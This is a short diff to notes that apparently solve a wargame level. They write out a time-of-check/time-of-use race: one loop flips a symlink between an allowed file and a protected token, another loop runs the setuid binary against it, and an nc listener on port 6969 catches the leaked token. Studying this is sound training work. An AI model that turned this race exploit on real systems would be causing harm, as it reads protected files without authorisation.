@@ -1,7 +1,7 @@
 # vulnerabiliy of access and cyclical file change between access and check
 strings ./level10 | grep 'Connecting' # shows the port
-while true; do ln -fs ~/level10 /tmp/exploit; ln -fs ~/token /tmp/exploit; done # linking two files to the same link
-while true; do ./level10 /tmp/exploit 127.0.0.1; done # using binary
+while true; do ln -fs ~/level10 /tmp/fake; ln -fs ~/token /tmp/fake; done # alternation of links between two files
+while true; do ./level10 /tmp/fake 127.0.0.1; done # using binary
 nc -l 6969 
 
 # do it 3 different windows
